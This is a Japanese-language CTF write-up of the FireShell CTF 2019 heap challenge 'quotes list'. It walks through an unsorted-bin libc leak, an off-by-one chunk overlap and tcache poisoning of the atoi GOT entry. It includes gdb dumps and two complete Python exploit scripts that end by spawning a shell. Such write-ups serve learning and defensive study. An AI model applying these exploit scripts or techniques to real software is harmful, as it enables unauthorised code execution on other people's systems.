# [pwn 483pts] quotes list - FireShell CTF 2019
FireShellのpwnもこれでラストですが、いよいよ点数が高いですね。
writeup見ても解けるか不安ですがやっていきましょう。
babyheapと同じく64ビットですがPIEやSSPは無効です。
libcバイナリも渡されます。
```
$ checksec quotes_list 
[*] 'quotes_list'
    Arch:       64 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
`/opt/glibc`直下のlibcやld-linuxを参照しているのでpatchelfで修正します。
```
$ cp quotes_list original_quotes_list
$ patchelf --set-interpreter ld-linux-x86-64.sp.2 quotes_list
$ patchelf --set-rpath `pwd` quotes_list
```
これで起動できるようになりました。

babyheapに続き、Create, Edit, Show, Deleteができるメモサービスです。
今回はグローバル変数quote_listで最大6つまでメモが管理され、各メモのサイズも指定できます。
サイズもグローバル変数length_listの配列で管理されます。
i番目のメモがdeleteされるとquote_list[i]=0, length_list[i]=-1となり、UAFはなさそうです。
Editではlength_list[i] + 1バイト書き込めるので、off-by-oneがあります。
Showの処理がよく分からなかったのですが、strncpyする先の領域をallocaしてるそうです。
```c
alloca(16 * ((chunk_size + 15) / 16))
```

さて、まずはlibcのベースアドレスをリークしましょう。
もうこの時点で分からなかったのですが、いろいろ調べるとunsorted binが使えるみたいです。
大きなチャンクをfreeするとunsorted binにリンクされるのですが、この際チャンクのfdとbkがunsorted binに繋ります。
fastbinとかの場合はfastbinから一方的にチャンクへ繋がっていたのですが、unsorted binはちゃんとunsorted binへのポインタが書き込まれます。
したがって、この状態でShowしてやればmain_arena中のunsorted binのアドレスが分かりそうです。

で、実際にgdbで追ってみたのですが、free直後は確かにunsorted binのヘッダへのポインタがfd, bkに記載されています。
```
gdb-peda$ x/32wx 0x00603250 <-- freed chunk
0x603250:       0x00000000      0x00000000      0x00001011      0x00000000
0x603260:       0xf7dd0ca0      0x00007fff      0xf7dd0ca0      0x00007fff
0x603270:       0x00000000      0x00000000      0x00000000      0x00000000
...
gdb-peda$ x/64wx &main_arena
...
0x7ffff7dd0c80 <main_arena+64>: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff7dd0c90 <main_arena+80>: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff7dd0ca0 <main_arena+96>: 0x006042b0      0x00000000      0x00000000      0x00000000
0x7ffff7dd0cb0 <main_arena+112>:        0x00603250      0x00000000      0x00603250      0x00000000
...
```
しかし次にmallocしてunsorted binにつながれたチャンクを使うと、次のようにbkが別のアドレスを指しました。
```
gdb-peda$ x/32wx 0x00603250
0x603250:       0x00000000      0x00000000      0x00000051      0x00000000
0x603260:       0x42424242      0x0a424242      0xf7dd12c0      0x00007fff
0x603270:       0x00603250      0x00000000      0x00603250      0x00000000
...
gdb-peda$ x/4wx 0x7ffff7dd12c0
0x7ffff7dd12c0 <main_arena+1664>:       0xf7dd12b0      0x00007fff      0xf7dd12b0      0x00007fff
```
とりあえずShowで見えるアドレスからmain_arena+1664分だけ引いてやればlibcのベースアドレスが分かります。
何でここにbkが向くのかはちょっと分かりませんでした。
分かる方がいたら是非教えてください。
```python
from ptrlib import *

def create_quote(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("Length: ")
    sock.sendline(str(size))
    sock.recvuntil("Content: ")
    sock.send(data)

def edit_quote(index, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))
    sock.recvuntil("Content: ")
    sock.send(data)

def show_quote(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))
    sock.recvuntil("Quote: ")
    return sock.recvline().rstrip()

def delete_quote(index):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))

libc = ELF("./libc.so.6")
sock = Socket("127.0.0.1", 2005)

create_quote(0x1000, 'A')
create_quote(0x40, 'B')
delete_quote(0)
create_quote(0x40, 'A' * 8)
addr_unsortedbin = u64(show_quote(0)[8:])
libc_base = addr_unsortedbin - libc.symbol("main_arena") - 1664
print(hex(libc.symbol("main_arena")))
dump("&unsorted_bin = " + hex(addr_unsortedbin))
dump("libc base = " + hex(libc_base))
```

さて、次にoff-by-oneの脆弱性を上手く使います。
0x??8バイトmallocで確保すれば、次のチャンクのprev_sizeは確保したチャンクで使うことができます。
その上で1バイトオーバーフローできるので、次のチャンクのサイズを書き換えられます。
例えばもともとサイズ0x21だったチャンクのサイズを0x71にした後にそのチャンクをfreeすると、チャンクはサイズ0x71のfastbinsに繋がれます。
したがって、次にサイズ0x68とかでmallocすると先程freeしたチャンクを使うことができます。
一方、freeしたチャンクの次のチャンクは新しくmallocされたチャンクのサイズ内に存在するので、次のチャンクは完全に操作できます。
これはOverlapと呼ばれる手法だそうです。

分かりにくいと思うのでもう少し丁寧に説明します。
次のように3つ領域を確保したとします。
```c
p1 = malloc(0x18);
p2 = malloc(0x18);
p3 = malloc(0x18);
```
p1へのoff-by-oneのせいでp2のサイズ情報が0x21から0x71に上書きされたとしましょう。
この状態でp2をfreeすると、もちろんサイズ0x71のままtcacheにリンクされます。
ここで
```
p4 = malloc(0x68);
```
すると、p4にはtcacheから取り出されたアドレスp2が入ります。
p4はサイズ0x68分だけ使い放題ですが、その領域にはp3がまるごと含まれます。

後はシンプルにtcache poisoningができます。
具体的にはp3をfreeして、p4のeditでp3のfdを好きなアドレスに設定し、2回mallocすれば2回目に好きなアドレスを返すことができます。
今回はatoiのGOTを返すようにしてsystemのアドレスを書き込みました。
あとはbabyheapと同様にメニューの選択肢で`/bin/sh\x00`と入力すればシェルが奪えます。

```python
from ptrlib import *

def create_quote(size, data):
    sock.recvuntil("> ")
    sock.sendline("1")
    sock.recvuntil("Length: ")
    sock.sendline(str(size))
    sock.recvuntil("Content: ")
    sock.send(data)

def edit_quote(index, data):
    sock.recvuntil("> ")
    sock.sendline("2")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))
    sock.recvuntil("Content: ")
    sock.send(data)

def show_quote(index):
    sock.recvuntil("> ")
    sock.sendline("3")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))
    sock.recvuntil("Quote: ")
    return sock.recvline().rstrip()

def delete_quote(index):
    sock.recvuntil("> ")
    sock.sendline("4")
    sock.recvuntil("Index: ")
    sock.sendline(str(index))

libc = ELF("./libc.so.6")
elf = ELF("./original_quotes_list")
sock = Socket("127.0.0.1", 2005)

# Leak libc base
create_quote(0x1000, 'A') # index=0
create_quote(0x28, 'B')   # index=1
create_quote(0x28, 'C') # index=2
create_quote(0x28, 'D') # index=3
delete_quote(0)
create_quote(0x28, 'A' * 8) # index=0
addr = u64(show_quote(0)[8:])
libc_base = addr - libc.symbol("main_arena") - 1664
addr_system = libc_base + libc.symbol('system')
dump("libc base = " + hex(libc_base))

# Overlap
edit_quote(1, '\x00'*0x28 + '\x71')
delete_quote(2)
create_quote(0x68, 'B') # index=2

# Now, quote:2 has quote:3 in it
# Let's do tcache poisoning!
delete_quote(3)
payload = b'A' * 0x20
payload += b'\x00' * 8
payload += p64(0x31)
payload += p64(elf.got('atoi')) # fd
edit_quote(2, payload)
create_quote(0x28, 'XXXXXXXX') # index=3
create_quote(0x28, p64(addr_system))

# Get the shell!
sock.recvuntil("> ")
sock.send("/bin/sh\x00")
sock.interactive()
```

# 感想
この一問でunsorted binやoverlapを知ることができて、めちゃくちゃ勉強になりました。
また一歩Heap Exploitへ足を踏み入れた感じがします。
特に以前習得したtcache poisoningは何もつまることなく利用できたので、pwn力の向上を実感できました。

# 参考文献
[1] [https://zeroload.github.io/ctf/2019/01/28/FireShell-2019-quotes-list/](https://zeroload.github.io/ctf/2019/01/28/FireShell-2019-quotes-list/)

[2] [https://gist.github.com/chmodxxx/98089058fc2a4663085a7642ab3d82fd](https://gist.github.com/chmodxxx/98089058fc2a4663085a7642ab3d82fd)

[3] [http://shimasyaro.hatenablog.com/entry/2017/09/13/161657](http://shimasyaro.hatenablog.com/entry/2017/09/13/161657)